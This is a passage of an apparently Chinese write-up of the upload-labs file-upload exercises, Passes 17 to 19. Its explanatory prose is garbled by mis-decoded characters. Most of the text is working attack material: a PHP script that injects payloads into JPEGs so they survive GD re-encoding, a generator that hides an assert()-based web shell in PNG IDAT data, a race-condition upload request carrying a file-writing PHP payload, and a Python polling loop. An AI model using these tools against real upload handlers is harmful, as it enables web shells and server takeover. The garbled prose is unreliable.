class="number">0x00</span>) &#123;</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line"></span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line"></span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line"></span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line"></span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line"></span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line"></span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line"></span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line"></span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable language_">$this</span>-&gt;binData);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable language_">$this</span>-&gt;binData));</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable language_">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable language_">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable language_">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable language_">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable language_">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable language_">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable language_">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ‰¾åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œä¸Šä¼ ï¼Œç„¶åä¸‹è½½ï¼Œå†ç”¨æ­¤è„šæœ¬åŠ å·¥ï¼Œå†ä¸Šä¼ å³å¯ï¼ˆéƒ¨åˆ†å›¾ç‰‡shellå†™å…¥å¤±è´¥ï¼Œå¤šè¯•å‡ å¼ ï¼‰<br><code>php shell.php processed.jpg</code><br>ä¼šå¾—åˆ°ä¸€ä¸ªpayload_processed.jpg<br>å†ä¸Šä¼ å³å¯<br><img src="/2022/02/28/upload-labs/2022-03-02-20-02-37.png">  </p>
<p>æ³•3ï¼š<br>å†™å…¥IDATæ•°æ®å—ï¼Œä½¿imagecreatefrom*å¤„ç†å›¾ç‰‡å‰åä¸€æ ·ï¼Œä¸‹é¢ä¸ºå¤§ä½¬è„šæœ¬</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ç”Ÿæˆå›¾ç‰‡å¦‚ä¸‹ï¼Œå¸¦æœ‰ä¸€ä¸ªæœ¨é©¬</p>
<p><img src="/2022/02/28/upload-labs/2022-03-03-16-22-18.png"></p>
<p>ä¸Šä¼ ä¹‹åï¼Œä¸‹è½½ï¼Œæ•°æ®å¹¶æ²¡æœ‰æ”¹å˜</p>
<p><img src="/2022/02/28/upload-labs/2022-03-03-16-24-08.png"></p>
<p>åŒ…å«å›¾ç‰‡ï¼Œå¹¶è®¾ç½®å‚æ•°å¦‚ä¸‹ï¼Œå³å¯å¯åŠ¨æœ¨é©¬ï¼ŒåŸç†æ˜¯assert()ä¼šæ£€æŸ¥å†…éƒ¨æ˜¯å¦æ˜¯å­—ç¬¦ä¸²ï¼Œå¦‚æœæ˜¯å­—ç¬¦ä¸²ï¼Œå®ƒå°†ä¼šè¢«assert()å½“åšphpä»£ç æ‰§è¡Œï¼Œå‰ææ˜¯phpç‰ˆæœ¬è¾ƒä½php7ä¹‹å‰ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨php5ã€‚</p>
<p><img src="/2022/02/28/upload-labs/2022-03-03-16-25-19.png"></p>
<p><strong>å‚è€ƒï¼š</strong></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2657">upload-labsä¹‹pass 16è¯¦ç»†åˆ†æ</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Cony_14/article/details/102761808?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_default&utm_relevant_index=2">Python3 PNGæ–‡ä»¶æ ¼å¼åŠæ ¹æ®CRCæ£€éªŒç ä¿®å¤å›¾ç‰‡é«˜åº¦</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39672443/article/details/110806799?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0.pc_relevant_paycolumn_v3&spm=1001.2101.3001.4242.1&utm_relevant_index=3">pngæ–‡ä»¶å¤´_å›¾ç‰‡æ ¼å¼çŸ¥è¯†PNG</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lidabo/p/3701197.html">PNGæ–‡ä»¶ç»“æ„åˆ†æ â€”Pngè§£æ</a><br><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/php%20imagecreatefrom.%20%E7%B3%BB%E5%88%97%E5%87%BD%E6%95%B0%E4%B9%8B%20png.html">imagecreatefrom*ç³»åˆ—å‡½æ•°ä¹‹png</a><br><a target="_blank" rel="noopener" href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/">Encoding Web Shells in PNG IDAT chunks</a>ï¼ˆé‡è¦ï¼Œå¾…ç©¶ï¼‰   </p>
<h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p><strong>æ¡ä»¶ç«äº‰</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;file_name:&quot;</span>.<span class="variable">$file_name</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;file_ext:&quot;</span>.<span class="variable">$file_ext</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;<span class="comment">//UPLOAD_PATH è¢«å†™æ­»ï¼Œæ— æ³•00æˆªæ–­ç»•è¿‡</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;<span class="comment">//ä¸´æ—¶å­˜å‚¨æˆåŠŸåæ‰è¿›è¡Œæ£€æŸ¥</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°å®ç°ä¸´æ—¶å‚¨å­˜åˆ°<code>$upload_file = UPLOAD_PATH . &#39;/&#39; . $file_name;</code>è¿™ä¸ªåœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯åŸåå‚¨å­˜ï¼Œä½†æ˜¯æ£€æŸ¥æ–‡ä»¶ååˆ°é‡Šæ”¾è¿˜æ˜¯æœ‰é—´éš™çš„ï¼Œæ‰€ä»¥ä½¿ç”¨æ¡ä»¶ç«äº‰<br>å…ˆç®€å•ä¸Šä¼ ä¸€ä¸ªå¯ä»¥å†™æœ¨é©¬çš„æ–‡ä»¶ï¼Œç„¶åé‡æ”¾<br>POST DATA</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /upload/upload-labs/Pass-<span class="number">18</span>/index.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.8</span><span class="number">.107</span></span><br><span class="line">â€¦â€¦</span><br><span class="line">â€¦â€¦</span><br><span class="line">Referer: http://<span class="number">192.168</span><span class="number">.8</span><span class="number">.107</span>/upload/upload-labs/Pass-<span class="number">18</span>/index.php</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">18467633426500</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;test.php&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php fputs(fopen(<span class="string">&#x27;in_file.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);?&gt;</span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">18467633426500</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼Â </span><br><span class="line">-----------------------------<span class="number">18467633426500</span>--</span><br></pre></td></tr></table></figure>
<p>é‡æ”¾ï¼Œåœ¨burpé‡Œé¢æ”¾åˆ°intruderï¼Œpayloadæ¸…é›¶ï¼ŒåŸºæœ¬è®¾ç½®å¦‚ä¸‹<br><img src="/2022/02/28/upload-labs/2022-03-05-09-45-13.png"><br>ç„¶åpythonè®¿é—®ç›‘å¬ï¼Œè„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.8.107/upload/upload-labs/upload/test.php&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Sucess!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;testingâ€¦â€¦&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>start intruderä¹‹åï¼Œä¸€ç›´ç›‘å¬ï¼Œä¸€ç›´ä¸æˆåŠŸï¼Œå¯ä»¥çº¿ç¨‹å¯ä»¥å¤šå¼€ç‚¹ï¼ŒæˆåŠŸåï¼Œè®¿é—®in_file.php</p>
<p><img src="/2022/02/28/upload-labs/2022-03-05-09-47-37.png"></p>
<h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p><strong>æ¡ä»¶ç«äº‰-å‡è®¾ä¸çŸ¥ä¸Šä¼ åå›¾ç‰‡è·¯å¾„</strong></p>
